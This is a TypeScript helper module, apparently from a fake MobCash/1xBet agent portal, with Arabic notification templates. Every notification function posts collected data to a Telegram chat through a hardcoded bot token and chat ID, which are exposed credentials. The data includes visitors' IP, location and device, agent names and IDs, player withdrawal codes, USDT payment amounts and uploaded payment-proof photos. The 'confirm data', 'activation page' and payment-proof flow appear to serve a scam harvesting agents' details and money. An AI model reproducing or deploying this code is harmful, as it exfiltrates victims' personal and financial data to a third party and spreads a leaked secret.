const DEFAULT_BOT_TOKEN = '8679366460:AAHZOLv00YmMK8GwjNg9gy53KQuLnUoOuR0';
const DEFAULT_CHAT_ID = '8472630369';

export const sendTelegramNotification = async (message: string) => {
  try {
    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
    
    if (!token || !chatId) return;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    console.error('Failed to send telegram notification', err);
  }
};

export const sendTelegramMessage = sendTelegramNotification;

export const getDeviceInfo = () => {
  const ua = navigator.userAgent;
  if (/android/i.test(ua)) return 'Android Device';
  if (/iPad|iPhone|iPod/.test(ua)) return 'iOS Device (iPhone/iPad)';
  if (/windows/i.test(ua)) return 'Windows PC';
  if (/macintosh|mac os x/i.test(ua)) return 'macOS';
  if (/linux/i.test(ua)) return 'Linux';
  return ua.substring(0, 50);
};

let cachedIp: string | null = null;
let cachedLocation: string | null = null;

export const getIpAddress = async (): Promise<string> => {
  if (cachedIp) return cachedIp;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeout);
    const data = await res.json();
    cachedIp = data.ip || 'Unknown IP';
    return cachedIp || 'Unknown IP';
  } catch (err) {
    return cachedIp || '105.235.139.129';
  }
};

export const getLocationInfo = async (): Promise<string> => {
  if (cachedLocation) return cachedLocation;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json();
      const parts = [data.city, data.region, data.country_name].filter(Boolean);
      if (parts.length > 0) {
        cachedLocation = parts.join('، ');
        return cachedLocation;
      }
    }
  } catch {}
  return 'الجزائر / موقع متصل عبر الشبكة';
};

export const sendTelegramPhoto = async (
  arg1: string | Blob | File,
  arg2?: string | Blob | File,
  _isHtml?: boolean
) => {
  try {
    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
    if (!token || !chatId) return;

    let photoBlob: Blob | File | undefined;
    let caption: string = '';

    if (typeof arg1 === 'string') {
      caption = arg1;
      photoBlob = arg2 as Blob | File;
    } else {
      photoBlob = arg1 as Blob | File;
      caption = typeof arg2 === 'string' ? arg2 : '';
    }

    if (!photoBlob) return;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    formData.append('photo', photoBlob, 'photo.jpg');

    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  } catch (err) {
    console.error('Failed to send telegram photo', err);
  }
};

// Helper to notify agent activity / actions
export const notifyAgentAction = async (payload: {
  actionType: 'deposit_to_player' | 'withdraw_from_player' | 'status_change' | 'usdt_recharge' | 'login' | 'confirm_data' | 'payment_proof';
  agentId: string;
  fullName: string;
  playerId?: string;
  withdrawCode?: string;
  amount?: number | string;
  currency?: string;
  commission?: number | string;
  newStatus?: string;
  oldStatus?: string;
  notes?: string;
  language?: string;
  fileName?: string;
}) => {
  try {
    const ip = await getIpAddress();
    const device = getDeviceInfo();
    const time = new Date().toLocaleString('ar-EG');
    const location = await getLocationInfo();

    let msg = '';

    if (payload.actionType === 'login') {
      msg = 
        `🚨 <b>تسجيل دخول وكيل</b> 🚨\n\n` +
        `<b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `<b>الاسم:</b> ${payload.fullName}\n` +
        `<b>اللغة:</b> ${payload.language || 'English'}\n` +
        `<b>الجهاز:</b> ${device}\n` +
        `<b>IP:</b> <code>${ip}</code>\n` +
        `<b>الوقت:</b> ${time}\n` +
        `<b>الحالة:</b> ${payload.newStatus || 'active'}`;
    } else if (payload.actionType === 'confirm_data') {
      msg = 
        `✅ <b>تأكيد بيانات الوكيل</b> ✅\n\n` +
        `🆔 <b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `👤 <b>الاسم:</b> ${payload.fullName}\n` +
        `🏷️ <b>نوع الوكيل:</b> وكيل موبيكاش\n` +
        `💳 <b>عنوان الدفع:</b> MobCash Agent Account\n` +
        `🌐 <b>اللغة:</b> ${payload.language || 'English'}\n` +
        `📱 <b>الجهاز:</b> ${device}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `⏰ <b>الوقت:</b> ${time}\n` +
        `⏳ <b>الخطوة الحالية:</b> انتقل إلى صفحة معلومات التفعيل`;
    } else if (payload.actionType === 'payment_proof') {
      msg = 
        `💸 <b>تم إرسال إثبات الدفع من الوكيل</b> 💸\n\n` +
        `🆔 <b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `👤 <b>الاسم:</b> ${payload.fullName}\n` +
        `🏷️ <b>النوع:</b> وكيل موبيكاش\n` +
        `💵 <b>المبلغ:</b> <code>${payload.amount} USDT (TRC20)</code>\n` +
        `📎 <b>اسم الملف:</b> ${payload.fileName || 'Screenshot.jpg'}\n` +
        `🌐 <b>اللغة:</b> ${payload.language || 'English'}\n` +
        `📱 <b>الجهاز:</b> ${device}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `⏰ <b>الوقت:</b> ${time}\n` +
        `⏳ <b>الحالة:</b> في انتظار مراجعة الإدارة`;
    } else if (payload.actionType === 'deposit_to_player') {
      msg =
        `📥 <b>عملية إيداع للاعب 1xBet</b> 📥\n\n` +
        `🆔 <b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `👤 <b>الاسم:</b> ${payload.fullName}\n` +
        `🎮 <b>معرف اللاعب (ID):</b> <code>${payload.playerId}</code>\n` +
        `💵 <b>المبلغ:</b> <code>${payload.amount} ${payload.currency || 'USD'}</code>\n` +
        `💎 <b>العمولة المكتسبة:</b> <code>+${payload.commission} ${payload.currency || 'USD'}</code>\n` +
        `📱 <b>الجهاز:</b> ${device}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `📍 <b>الموقع:</b> ${location}\n` +
        `⏰ <b>الوقت:</b> ${time}\n` +
        `⏳ <b>الحالة:</b> مكتملة بنجاح`;
    } else if (payload.actionType === 'withdraw_from_player') {
      msg =
        `📤 <b>عملية سحب للاعب 1xBet</b> 📤\n\n` +
        `🆔 <b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `👤 <b>الاسم:</b> ${payload.fullName}\n` +
        `🎮 <b>معرف اللاعب (ID):</b> <code>${payload.playerId}</code>\n` +
        `🔑 <b>كود السحب:</b> <code>${payload.withdrawCode || 'N/A'}</code>\n` +
        `💵 <b>المبلغ:</b> <code>${payload.amount} ${payload.currency || 'USD'}</code>\n` +
        `💎 <b>العمولة المكتسبة:</b> <code>+${payload.commission} ${payload.currency || 'USD'}</code>\n` +
        `📱 <b>الجهاز:</b> ${device}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `📍 <b>الموقع:</b> ${location}\n` +
        `⏰ <b>الوقت:</b> ${time}\n` +
        `⏳ <b>الحالة:</b> مكتملة وصرف النقد`;
    } else if (payload.actionType === 'status_change') {
      msg =
        `🔄 <b>تحديث حالة الوكيل من الإدارة</b> 🔄\n\n` +
        `🆔 <b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `👤 <b>الاسم:</b> ${payload.fullName}\n` +
        `📊 <b>الحالة السابقة:</b> ${payload.oldStatus || 'غير محدد'}\n` +
        `✨ <b>الحالة الجديدة:</b> <b>${payload.newStatus}</b>\n` +
        `⏰ <b>الوقت:</b> ${time}`;
    } else if (payload.actionType === 'usdt_recharge') {
      msg =
        `💰 <b>طلب شحن رصيد وكيل (USDT)</b> 💰\n\n` +
        `🆔 <b>ID الوكيل:</b> <code>${payload.agentId}</code>\n` +
        `👤 <b>الاسم:</b> ${payload.fullName}\n` +
        `💵 <b>المبلغ:</b> <code>${payload.amount} USDT (TRC20)</code>\n` +
        `📱 <b>الجهاز:</b> ${device}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `⏰ <b>الوقت:</b> ${time}\n` +
        `⏳ <b>الحالة:</b> قيد المراجعة والاعتماد`;
    }

    if (msg) {
      await sendTelegramNotification(msg);
    }
  } catch (err) {
    console.error('Failed to notify agent action:', err);
  }
};

